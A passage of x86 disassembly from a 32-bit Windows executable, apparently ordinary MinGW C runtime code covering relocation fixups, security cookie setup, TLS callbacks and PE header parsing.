  409d6c:	66 89 45 c4          	mov    %ax,-0x3c(%ebp)
  409d70:	89 d0                	mov    %edx,%eax
  409d72:	0d 00 00 ff ff       	or     $0xffff0000,%eax
  409d77:	66 83 7d c4 00       	cmpw   $0x0,-0x3c(%ebp)
  409d7c:	0f 48 d0             	cmovs  %eax,%edx
  409d7f:	89 f0                	mov    %esi,%eax
  409d81:	29 ca                	sub    %ecx,%edx
  409d83:	81 ea 00 00 40 00    	sub    $0x400000,%edx
  409d89:	01 fa                	add    %edi,%edx
  409d8b:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409d8e:	e8 ad fc ff ff       	call   0x409a40
  409d93:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  409d97:	66 89 06             	mov    %ax,(%esi)
  409d9a:	83 c3 0c             	add    $0xc,%ebx
  409d9d:	81 fb 08 10 41 00    	cmp    $0x411008,%ebx
  409da3:	0f 82 8e fe ff ff    	jb     0x409c37
  409da9:	e9 15 ff ff ff       	jmp    0x409cc3
  409dae:	0f b6 06             	movzbl (%esi),%eax
  409db1:	0f b6 d0             	movzbl %al,%edx
  409db4:	89 d1                	mov    %edx,%ecx
  409db6:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  409dbc:	84 c0                	test   %al,%al
  409dbe:	0f 48 d1             	cmovs  %ecx,%edx
  409dc1:	89 f0                	mov    %esi,%eax
  409dc3:	2b 55 c4             	sub    -0x3c(%ebp),%edx
  409dc6:	01 fa                	add    %edi,%edx
  409dc8:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409dcb:	e8 70 fc ff ff       	call   0x409a40
  409dd0:	0f b6 45 cc          	movzbl -0x34(%ebp),%eax
  409dd4:	88 06                	mov    %al,(%esi)
  409dd6:	eb c2                	jmp    0x409d9a
  409dd8:	2b 7d c4             	sub    -0x3c(%ebp),%edi
  409ddb:	89 f0                	mov    %esi,%eax
  409ddd:	03 3e                	add    (%esi),%edi
  409ddf:	89 7d cc             	mov    %edi,-0x34(%ebp)
  409de2:	e8 59 fc ff ff       	call   0x409a40
  409de7:	89 3e                	mov    %edi,(%esi)
  409de9:	eb af                	jmp    0x409d9a
  409deb:	8b 0d f4 e2 41 00    	mov    0x41e2f4,%ecx
  409df1:	01 f1                	add    %esi,%ecx
  409df3:	8b 41 04             	mov    0x4(%ecx),%eax
  409df6:	89 44 24 08          	mov    %eax,0x8(%esp)
  409dfa:	8b 41 08             	mov    0x8(%ecx),%eax
  409dfd:	8b 40 08             	mov    0x8(%eax),%eax
  409e00:	c7 04 24 c4 03 41 00 	movl   $0x4103c4,(%esp)
  409e07:	89 44 24 04          	mov    %eax,0x4(%esp)
  409e0b:	e8 d0 fb ff ff       	call   0x4099e0
  409e10:	89 44 24 04          	mov    %eax,0x4(%esp)
  409e14:	c7 04 24 20 04 41 00 	movl   $0x410420,(%esp)
  409e1b:	e8 c0 fb ff ff       	call   0x4099e0
  409e20:	db e3                	fninit
  409e22:	c3                   	ret
  409e23:	90                   	nop
  409e24:	90                   	nop
  409e25:	90                   	nop
  409e26:	90                   	nop
  409e27:	90                   	nop
  409e28:	90                   	nop
  409e29:	90                   	nop
  409e2a:	90                   	nop
  409e2b:	90                   	nop
  409e2c:	90                   	nop
  409e2d:	90                   	nop
  409e2e:	90                   	nop
  409e2f:	90                   	nop
  409e30:	a1 18 b0 40 00       	mov    0x40b018,%eax
  409e35:	8b 00                	mov    (%eax),%eax
  409e37:	85 c0                	test   %eax,%eax
  409e39:	74 1f                	je     0x409e5a
  409e3b:	83 ec 0c             	sub    $0xc,%esp
  409e3e:	66 90                	xchg   %ax,%ax
  409e40:	ff d0                	call   *%eax
  409e42:	a1 18 b0 40 00       	mov    0x40b018,%eax
  409e47:	8d 50 04             	lea    0x4(%eax),%edx
  409e4a:	8b 40 04             	mov    0x4(%eax),%eax
  409e4d:	89 15 18 b0 40 00    	mov    %edx,0x40b018
  409e53:	85 c0                	test   %eax,%eax
  409e55:	75 e9                	jne    0x409e40
  409e57:	83 c4 0c             	add    $0xc,%esp
  409e5a:	f3 c3                	repz ret
  409e5c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409e60:	53                   	push   %ebx
  409e61:	83 ec 18             	sub    $0x18,%esp
  409e64:	8b 1d e0 a9 40 00    	mov    0x40a9e0,%ebx
  409e6a:	83 fb ff             	cmp    $0xffffffff,%ebx
  409e6d:	74 24                	je     0x409e93
  409e6f:	85 db                	test   %ebx,%ebx
  409e71:	74 0f                	je     0x409e82
  409e73:	ff 14 9d e0 a9 40 00 	call   *0x40a9e0(,%ebx,4)
  409e7a:	83 eb 01             	sub    $0x1,%ebx
  409e7d:	8d 76 00             	lea    0x0(%esi),%esi
  409e80:	75 f1                	jne    0x409e73
  409e82:	c7 04 24 30 9e 40 00 	movl   $0x409e30,(%esp)
  409e89:	e8 12 f9 ff ff       	call   0x4097a0
  409e8e:	83 c4 18             	add    $0x18,%esp
  409e91:	5b                   	pop    %ebx
  409e92:	c3                   	ret
  409e93:	31 db                	xor    %ebx,%ebx
  409e95:	eb 02                	jmp    0x409e99
  409e97:	89 c3                	mov    %eax,%ebx
  409e99:	8d 43 01             	lea    0x1(%ebx),%eax
  409e9c:	8b 14 85 e0 a9 40 00 	mov    0x40a9e0(,%eax,4),%edx
  409ea3:	85 d2                	test   %edx,%edx
  409ea5:	75 f0                	jne    0x409e97
  409ea7:	eb c6                	jmp    0x409e6f
  409ea9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409eb0:	a1 f8 e2 41 00       	mov    0x41e2f8,%eax
  409eb5:	85 c0                	test   %eax,%eax
  409eb7:	74 07                	je     0x409ec0
  409eb9:	f3 c3                	repz ret
  409ebb:	90                   	nop
  409ebc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409ec0:	c7 05 f8 e2 41 00 01 	movl   $0x1,0x41e2f8
  409ec7:	00 00 00 
  409eca:	eb 94                	jmp    0x409e60
  409ecc:	90                   	nop
  409ecd:	90                   	nop
  409ece:	90                   	nop
  409ecf:	90                   	nop
  409ed0:	55                   	push   %ebp
  409ed1:	89 e5                	mov    %esp,%ebp
  409ed3:	83 ec 18             	sub    $0x18,%esp
  409ed6:	a1 00 b0 40 00       	mov    0x40b000,%eax
  409edb:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  409ee2:	00 
  409ee3:	89 44 24 0c          	mov    %eax,0xc(%esp)
  409ee7:	a1 68 e6 41 00       	mov    0x41e668,%eax
  409eec:	89 44 24 08          	mov    %eax,0x8(%esp)
  409ef0:	a1 6c e6 41 00       	mov    0x41e66c,%eax
  409ef5:	89 04 24             	mov    %eax,(%esp)
  409ef8:	e8 13 76 ff ff       	call   0x401510
  409efd:	83 ec 10             	sub    $0x10,%esp
  409f00:	c9                   	leave
  409f01:	c3                   	ret
  409f02:	90                   	nop
  409f03:	90                   	nop
  409f04:	90                   	nop
  409f05:	90                   	nop
  409f06:	90                   	nop
  409f07:	90                   	nop
  409f08:	90                   	nop
  409f09:	90                   	nop
  409f0a:	90                   	nop
  409f0b:	90                   	nop
  409f0c:	90                   	nop
  409f0d:	90                   	nop
  409f0e:	90                   	nop
  409f0f:	90                   	nop
  409f10:	55                   	push   %ebp
  409f11:	89 e5                	mov    %esp,%ebp
  409f13:	57                   	push   %edi
  409f14:	56                   	push   %esi
  409f15:	53                   	push   %ebx
  409f16:	83 ec 2c             	sub    $0x2c,%esp
  409f19:	a1 30 b0 40 00       	mov    0x40b030,%eax
  409f1e:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  409f25:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  409f2c:	3d 4e e6 40 bb       	cmp    $0xbb40e64e,%eax
  409f31:	74 0f                	je     0x409f42
  409f33:	f7 d0                	not    %eax
  409f35:	a3 34 b0 40 00       	mov    %eax,0x40b034
  409f3a:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409f3d:	5b                   	pop    %ebx
  409f3e:	5e                   	pop    %esi
  409f3f:	5f                   	pop    %edi
  409f40:	5d                   	pop    %ebp
  409f41:	c3                   	ret
  409f42:	8d 45 d8             	lea    -0x28(%ebp),%eax
  409f45:	89 04 24             	mov    %eax,(%esp)
  409f48:	ff 15 64 f2 41 00    	call   *0x41f264
  409f4e:	8b 75 d8             	mov    -0x28(%ebp),%esi
  409f51:	8b 7d dc             	mov    -0x24(%ebp),%edi
  409f54:	31 fe                	xor    %edi,%esi
  409f56:	83 ec 04             	sub    $0x4,%esp
  409f59:	ff 15 3c f2 41 00    	call   *0x41f23c
  409f5f:	89 c3                	mov    %eax,%ebx
  409f61:	ff 15 40 f2 41 00    	call   *0x41f240
  409f67:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  409f6a:	ff 15 6c f2 41 00    	call   *0x41f26c
  409f70:	89 45 d0             	mov    %eax,-0x30(%ebp)
  409f73:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409f76:	89 04 24             	mov    %eax,(%esp)
  409f79:	ff 15 84 f2 41 00    	call   *0x41f284
  409f7f:	33 75 e0             	xor    -0x20(%ebp),%esi
  409f82:	33 75 e4             	xor    -0x1c(%ebp),%esi
  409f85:	31 de                	xor    %ebx,%esi
  409f87:	33 75 d4             	xor    -0x2c(%ebp),%esi
  409f8a:	83 ec 04             	sub    $0x4,%esp
  409f8d:	33 75 d0             	xor    -0x30(%ebp),%esi
  409f90:	81 fe 4e e6 40 bb    	cmp    $0xbb40e64e,%esi
  409f96:	74 18                	je     0x409fb0
  409f98:	89 f0                	mov    %esi,%eax
  409f9a:	f7 d0                	not    %eax
  409f9c:	89 35 30 b0 40 00    	mov    %esi,0x40b030
  409fa2:	a3 34 b0 40 00       	mov    %eax,0x40b034
  409fa7:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409faa:	5b                   	pop    %ebx
  409fab:	5e                   	pop    %esi
  409fac:	5f                   	pop    %edi
  409fad:	5d                   	pop    %ebp
  409fae:	c3                   	ret
  409faf:	90                   	nop
  409fb0:	b8 b0 19 bf 44       	mov    $0x44bf19b0,%eax
  409fb5:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  409fba:	eb e0                	jmp    0x409f9c
  409fbc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409fc0:	55                   	push   %ebp
  409fc1:	89 e5                	mov    %esp,%ebp
  409fc3:	83 ec 28             	sub    $0x28,%esp
  409fc6:	8b 45 04             	mov    0x4(%ebp),%eax
  409fc9:	8d 55 04             	lea    0x4(%ebp),%edx
  409fcc:	89 15 c4 e3 41 00    	mov    %edx,0x41e3c4
  409fd2:	c7 05 e0 e5 41 00 09 	movl   $0xc0000409,0x41e5e0
  409fd9:	04 00 c0 
  409fdc:	c7 05 e4 e5 41 00 01 	movl   $0x1,0x41e5e4
  409fe3:	00 00 00 
  409fe6:	a3 b8 e3 41 00       	mov    %eax,0x41e3b8
  409feb:	a3 ec e5 41 00       	mov    %eax,0x41e5ec
  409ff0:	8b 45 08             	mov    0x8(%ebp),%eax
  409ff3:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  409ffa:	a3 ac e3 41 00       	mov    %eax,0x41e3ac
  409fff:	a1 30 b0 40 00       	mov    0x40b030,%eax
  40a004:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40a007:	a1 34 b0 40 00       	mov    0x40b034,%eax
  40a00c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a00f:	ff 15 90 f2 41 00    	call   *0x41f290
  40a015:	83 ec 04             	sub    $0x4,%esp
  40a018:	c7 04 24 80 04 41 00 	movl   $0x410480,(%esp)
  40a01f:	ff 15 a0 f2 41 00    	call   *0x41f2a0
  40a025:	83 ec 04             	sub    $0x4,%esp
  40a028:	ff 15 38 f2 41 00    	call   *0x41f238
  40a02e:	c7 44 24 04 09 04 00 	movl   $0xc0000409,0x4(%esp)
  40a035:	c0 
  40a036:	89 04 24             	mov    %eax,(%esp)
  40a039:	ff 15 98 f2 41 00    	call   *0x41f298
  40a03f:	83 ec 08             	sub    $0x8,%esp
  40a042:	e8 81 09 00 00       	call   0x40a9c8
  40a047:	90                   	nop
  40a048:	90                   	nop
  40a049:	90                   	nop
  40a04a:	90                   	nop
  40a04b:	90                   	nop
  40a04c:	90                   	nop
  40a04d:	90                   	nop
  40a04e:	90                   	nop
  40a04f:	90                   	nop
  40a050:	55                   	push   %ebp
  40a051:	89 e5                	mov    %esp,%ebp
  40a053:	57                   	push   %edi
  40a054:	56                   	push   %esi
  40a055:	53                   	push   %ebx
  40a056:	83 ec 1c             	sub    $0x1c,%esp
  40a059:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a060:	ff 15 28 f2 41 00    	call   *0x41f228
  40a066:	8b 3d 40 e6 41 00    	mov    0x41e640,%edi
  40a06c:	8b 35 4c f2 41 00    	mov    0x41f24c,%esi
  40a072:	83 ec 04             	sub    $0x4,%esp
  40a075:	85 ff                	test   %edi,%edi
  40a077:	74 30                	je     0x40a0a9
  40a079:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a080:	8b 07                	mov    (%edi),%eax
  40a082:	89 04 24             	mov    %eax,(%esp)
  40a085:	ff 15 9c f2 41 00    	call   *0x41f29c
  40a08b:	83 ec 04             	sub    $0x4,%esp
  40a08e:	89 c3                	mov    %eax,%ebx
  40a090:	ff d6                	call   *%esi
  40a092:	85 c0                	test   %eax,%eax
  40a094:	75 0c                	jne    0x40a0a2
  40a096:	85 db                	test   %ebx,%ebx
  40a098:	74 08                	je     0x40a0a2
  40a09a:	8b 47 04             	mov    0x4(%edi),%eax
  40a09d:	89 1c 24             	mov    %ebx,(%esp)
  40a0a0:	ff d0                	call   *%eax
  40a0a2:	8b 7f 08             	mov    0x8(%edi),%edi
  40a0a5:	85 ff                	test   %edi,%edi
  40a0a7:	75 d7                	jne    0x40a080
  40a0a9:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a0b0:	ff 15 74 f2 41 00    	call   *0x41f274
  40a0b6:	83 ec 04             	sub    $0x4,%esp
  40a0b9:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40a0bc:	5b                   	pop    %ebx
  40a0bd:	5e                   	pop    %esi
  40a0be:	5f                   	pop    %edi
  40a0bf:	5d                   	pop    %ebp
  40a0c0:	c3                   	ret
  40a0c1:	eb 0d                	jmp    0x40a0d0
  40a0c3:	90                   	nop
  40a0c4:	90                   	nop
  40a0c5:	90                   	nop
  40a0c6:	90                   	nop
  40a0c7:	90                   	nop
  40a0c8:	90                   	nop
  40a0c9:	90                   	nop
  40a0ca:	90                   	nop
  40a0cb:	90                   	nop
  40a0cc:	90                   	nop
  40a0cd:	90                   	nop
  40a0ce:	90                   	nop
  40a0cf:	90                   	nop
  40a0d0:	55                   	push   %ebp
  40a0d1:	89 e5                	mov    %esp,%ebp
  40a0d3:	56                   	push   %esi
  40a0d4:	31 f6                	xor    %esi,%esi
  40a0d6:	53                   	push   %ebx
  40a0d7:	83 ec 10             	sub    $0x10,%esp
  40a0da:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a0df:	85 c0                	test   %eax,%eax
  40a0e1:	75 0d                	jne    0x40a0f0
  40a0e3:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40a0e6:	89 f0                	mov    %esi,%eax
  40a0e8:	5b                   	pop    %ebx
  40a0e9:	5e                   	pop    %esi
  40a0ea:	5d                   	pop    %ebp
  40a0eb:	c3                   	ret
  40a0ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a0f0:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  40a0f7:	00 
  40a0f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40a0ff:	e8 ec 07 00 00       	call   0x40a8f0
  40a104:	85 c0                	test   %eax,%eax
  40a106:	89 c3                	mov    %eax,%ebx
  40a108:	74 42                	je     0x40a14c
  40a10a:	8b 45 08             	mov    0x8(%ebp),%eax
  40a10d:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a114:	89 03                	mov    %eax,(%ebx)
  40a116:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a119:	89 43 04             	mov    %eax,0x4(%ebx)
  40a11c:	ff 15 28 f2 41 00    	call   *0x41f228
  40a122:	a1 40 e6 41 00       	mov    0x41e640,%eax
  40a127:	89 1d 40 e6 41 00    	mov    %ebx,0x41e640
  40a12d:	89 43 08             	mov    %eax,0x8(%ebx)
  40a130:	83 ec 04             	sub    $0x4,%esp
  40a133:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a13a:	ff 15 74 f2 41 00    	call   *0x41f274
  40a140:	89 f0                	mov    %esi,%eax
  40a142:	83 ec 04             	sub    $0x4,%esp
  40a145:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40a148:	5b                   	pop    %ebx
  40a149:	5e                   	pop    %esi
  40a14a:	5d                   	pop    %ebp
  40a14b:	c3                   	ret
  40a14c:	be ff ff ff ff       	mov    $0xffffffff,%esi
  40a151:	eb 90                	jmp    0x40a0e3
  40a153:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a159:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a160:	55                   	push   %ebp
  40a161:	89 e5                	mov    %esp,%ebp
  40a163:	53                   	push   %ebx
  40a164:	83 ec 14             	sub    $0x14,%esp
  40a167:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a16c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40a16f:	85 c0                	test   %eax,%eax
  40a171:	75 0d                	jne    0x40a180
  40a173:	31 c0                	xor    %eax,%eax
  40a175:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40a178:	c9                   	leave
  40a179:	c3                   	ret
  40a17a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a180:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a187:	ff 15 28 f2 41 00    	call   *0x41f228
  40a18d:	8b 15 40 e6 41 00    	mov    0x41e640,%edx
  40a193:	83 ec 04             	sub    $0x4,%esp
  40a196:	85 d2                	test   %edx,%edx
  40a198:	74 17                	je     0x40a1b1
  40a19a:	8b 02                	mov    (%edx),%eax
  40a19c:	39 d8                	cmp    %ebx,%eax
  40a19e:	75 0a                	jne    0x40a1aa
  40a1a0:	eb 46                	jmp    0x40a1e8
  40a1a2:	8b 08                	mov    (%eax),%ecx
  40a1a4:	39 d9                	cmp    %ebx,%ecx
  40a1a6:	74 20                	je     0x40a1c8
  40a1a8:	89 c2                	mov    %eax,%edx
  40a1aa:	8b 42 08             	mov    0x8(%edx),%eax
  40a1ad:	85 c0                	test   %eax,%eax
  40a1af:	75 f1                	jne    0x40a1a2
  40a1b1:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a1b8:	ff 15 74 f2 41 00    	call   *0x41f274
  40a1be:	83 ec 04             	sub    $0x4,%esp
  40a1c1:	31 c0                	xor    %eax,%eax
  40a1c3:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40a1c6:	c9                   	leave
  40a1c7:	c3                   	ret
  40a1c8:	8b 48 08             	mov    0x8(%eax),%ecx
  40a1cb:	89 4a 08             	mov    %ecx,0x8(%edx)
  40a1ce:	89 04 24             	mov    %eax,(%esp)
  40a1d1:	e8 c2 06 00 00       	call   0x40a898
  40a1d6:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a1dd:	ff 15 74 f2 41 00    	call   *0x41f274
  40a1e3:	83 ec 04             	sub    $0x4,%esp
  40a1e6:	eb d9                	jmp    0x40a1c1
  40a1e8:	8b 42 08             	mov    0x8(%edx),%eax
  40a1eb:	a3 40 e6 41 00       	mov    %eax,0x41e640
  40a1f0:	89 d0                	mov    %edx,%eax
  40a1f2:	eb da                	jmp    0x40a1ce
  40a1f4:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a1fa:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  40a200:	55                   	push   %ebp
  40a201:	89 e5                	mov    %esp,%ebp
  40a203:	83 ec 18             	sub    $0x18,%esp
  40a206:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a209:	83 f8 01             	cmp    $0x1,%eax
  40a20c:	74 46                	je     0x40a254
  40a20e:	72 15                	jb     0x40a225
  40a210:	83 f8 03             	cmp    $0x3,%eax
  40a213:	75 09                	jne    0x40a21e
  40a215:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a21a:	85 c0                	test   %eax,%eax
  40a21c:	75 64                	jne    0x40a282
  40a21e:	b8 01 00 00 00       	mov    $0x1,%eax
  40a223:	c9                   	leave
  40a224:	c3                   	ret
  40a225:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a22a:	85 c0                	test   %eax,%eax
  40a22c:	75 62                	jne    0x40a290
  40a22e:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a233:	83 f8 01             	cmp    $0x1,%eax
  40a236:	75 e6                	jne    0x40a21e
  40a238:	c7 05 44 e6 41 00 00 	movl   $0x0,0x41e644
  40a23f:	00 00 00 
  40a242:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a249:	ff 15 24 f2 41 00    	call   *0x41f224
  40a24f:	83 ec 04             	sub    $0x4,%esp
  40a252:	eb ca                	jmp    0x40a21e
  40a254:	a1 44 e6 41 00       	mov    0x41e644,%eax
  40a259:	85 c0                	test   %eax,%eax
  40a25b:	74 13                	je     0x40a270
  40a25d:	c7 05 44 e6 41 00 01 	movl   $0x1,0x41e644
  40a264:	00 00 00 
  40a267:	b8 01 00 00 00       	mov    $0x1,%eax
  40a26c:	c9                   	leave
  40a26d:	c3                   	ret
  40a26e:	66 90                	xchg   %ax,%ax
  40a270:	c7 04 24 48 e6 41 00 	movl   $0x41e648,(%esp)
  40a277:	ff 15 70 f2 41 00    	call   *0x41f270
  40a27d:	83 ec 04             	sub    $0x4,%esp
  40a280:	eb db                	jmp    0x40a25d
  40a282:	e8 c9 fd ff ff       	call   0x40a050
  40a287:	eb 95                	jmp    0x40a21e
  40a289:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a290:	e8 bb fd ff ff       	call   0x40a050
  40a295:	eb 97                	jmp    0x40a22e
  40a297:	90                   	nop
  40a298:	90                   	nop
  40a299:	90                   	nop
  40a29a:	90                   	nop
  40a29b:	90                   	nop
  40a29c:	90                   	nop
  40a29d:	90                   	nop
  40a29e:	90                   	nop
  40a29f:	90                   	nop
  40a2a0:	03 40 3c             	add    0x3c(%eax),%eax
  40a2a3:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  40a2a9:	74 05                	je     0x40a2b0
  40a2ab:	31 c0                	xor    %eax,%eax
  40a2ad:	c3                   	ret
  40a2ae:	66 90                	xchg   %ax,%ax
  40a2b0:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  40a2b6:	0f 94 c0             	sete   %al
  40a2b9:	0f b6 c0             	movzbl %al,%eax
  40a2bc:	c3                   	ret
  40a2bd:	8d 76 00             	lea    0x0(%esi),%esi
  40a2c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a2c4:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  40a2c9:	74 05                	je     0x40a2d0
  40a2cb:	31 c0                	xor    %eax,%eax
  40a2cd:	c3                   	ret
  40a2ce:	66 90                	xchg   %ax,%ax
  40a2d0:	eb ce                	jmp    0x40a2a0
  40a2d2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a2d9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a2e0:	56                   	push   %esi
  40a2e1:	53                   	push   %ebx
  40a2e2:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40a2e6:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40a2ea:	03 52 3c             	add    0x3c(%edx),%edx
  40a2ed:	0f b7 72 06          	movzwl 0x6(%edx),%esi
  40a2f1:	0f b7 42 14          	movzwl 0x14(%edx),%eax
  40a2f5:	85 f6                	test   %esi,%esi
  40a2f7:	8d 44 02 18          	lea    0x18(%edx,%eax,1),%eax
  40a2fb:	74 1b                	je     0x40a318
  40a2fd:	31 d2                	xor    %edx,%edx
  40a2ff:	90                   	nop
  40a300:	8b 48 0c             	mov    0xc(%eax),%ecx
  40a303:	39 d9                	cmp    %ebx,%ecx
  40a305:	77 07                	ja     0x40a30e
  40a307:	03 48 08             	add    0x8(%eax),%ecx
  40a30a:	39 cb                	cmp    %ecx,%ebx
  40a30c:	72 0c                	jb     0x40a31a
  40a30e:	83 c2 01             	add    $0x1,%edx
  40a311:	83 c0 28             	add    $0x28,%eax
  40a314:	39 f2                	cmp    %esi,%edx
  40a316:	72 e8                	jb     0x40a300
  40a318:	31 c0                	xor    %eax,%eax
  40a31a:	5b                   	pop    %ebx
  40a31b:	5e                   	pop    %esi
  40a31c:	c3                   	ret
  40a31d:	8d 76 00             	lea    0x0(%esi),%esi
  40a320:	55                   	push   %ebp
  40a321:	57                   	push   %edi
  40a322:	56                   	push   %esi
  40a323:	31 f6                	xor    %esi,%esi
  40a325:	53                   	push   %ebx
  40a326:	83 ec 1c             	sub    $0x1c,%esp
  40a329:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40a32d:	89 3c 24             	mov    %edi,(%esp)
  40a330:	e8 93 05 00 00       	call   0x40a8c8
  40a335:	83 f8 08             	cmp    $0x8,%eax
  40a338:	77 0b                	ja     0x40a345
  40a33a:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a341:	4d 5a 
  40a343:	74 0b                	je     0x40a350
  40a345:	83 c4 1c             	add    $0x1c,%esp
  40a348:	89 f0                	mov    %esi,%eax
  40a34a:	5b                   	pop    %ebx
  40a34b:	5e                   	pop    %esi
  40a34c:	5f                   	pop    %edi
  40a34d:	5d                   	pop    %ebp
  40a34e:	c3                   	ret
  40a34f:	90                   	nop
  40a350:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a355:	e8 46 ff ff ff       	call   0x40a2a0
  40a35a:	85 c0                	test   %eax,%eax
  40a35c:	74 e7                	je     0x40a345
  40a35e:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a363:	8d 90 00 00 40 00    	lea    0x400000(%eax),%edx
  40a369:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  40a370:	0f b7 6a 06          	movzwl 0x6(%edx),%ebp
  40a374:	8d 5c 02 18          	lea    0x18(%edx,%eax,1),%ebx
  40a378:	85 ed                	test   %ebp,%ebp
  40a37a:	75 0e                	jne    0x40a38a
  40a37c:	eb c7                	jmp    0x40a345
  40a37e:	66 90                	xchg   %ax,%ax
  40a380:	83 c6 01             	add    $0x1,%esi
  40a383:	83 c3 28             	add    $0x28,%ebx
  40a386:	39 ee                	cmp    %ebp,%esi
  40a388:	73 26                	jae    0x40a3b0
  40a38a:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  40a391:	00 
  40a392:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40a396:	89 1c 24             	mov    %ebx,(%esp)
  40a399:	e8 32 05 00 00       	call   0x40a8d0
  40a39e:	85 c0                	test   %eax,%eax
  40a3a0:	75 de                	jne    0x40a380
  40a3a2:	83 c4 1c             	add    $0x1c,%esp
  40a3a5:	89 de                	mov    %ebx,%esi
  40a3a7:	89 f0                	mov    %esi,%eax
  40a3a9:	5b                   	pop    %ebx
  40a3aa:	5e                   	pop    %esi
  40a3ab:	5f                   	pop    %edi
  40a3ac:	5d                   	pop    %ebp
  40a3ad:	c3                   	ret
  40a3ae:	66 90                	xchg   %ax,%ax
  40a3b0:	83 c4 1c             	add    $0x1c,%esp
  40a3b3:	31 f6                	xor    %esi,%esi
  40a3b5:	5b                   	pop    %ebx
  40a3b6:	89 f0                	mov    %esi,%eax
  40a3b8:	5e                   	pop    %esi
  40a3b9:	5f                   	pop    %edi
  40a3ba:	5d                   	pop    %ebp
  40a3bb:	c3                   	ret
  40a3bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a3c0:	53                   	push   %ebx
  40a3c1:	31 db                	xor    %ebx,%ebx
  40a3c3:	83 ec 08             	sub    $0x8,%esp
  40a3c6:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a3cd:	4d 5a 
  40a3cf:	74 07                	je     0x40a3d8
  40a3d1:	83 c4 08             	add    $0x8,%esp
  40a3d4:	89 d8                	mov    %ebx,%eax
  40a3d6:	5b                   	pop    %ebx
  40a3d7:	c3                   	ret
  40a3d8:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a3dd:	e8 be fe ff ff       	call   0x40a2a0
  40a3e2:	85 c0                	test   %eax,%eax
  40a3e4:	74 eb                	je     0x40a3d1
  40a3e6:	8b 44 24 10          	mov    0x10(%esp),%eax
  40a3ea:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a3f1:	2d 00 00 40 00       	sub    $0x400000,%eax
  40a3f6:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a3fa:	e8 e1 fe ff ff       	call   0x40a2e0
  40a3ff:	83 c4 08             	add    $0x8,%esp
  40a402:	89 c3                	mov    %eax,%ebx
  40a404:	89 d8                	mov    %ebx,%eax
  40a406:	5b                   	pop    %ebx
  40a407:	c3                   	ret
  40a408:	90                   	nop
  40a409:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a410:	53                   	push   %ebx
  40a411:	31 db                	xor    %ebx,%ebx
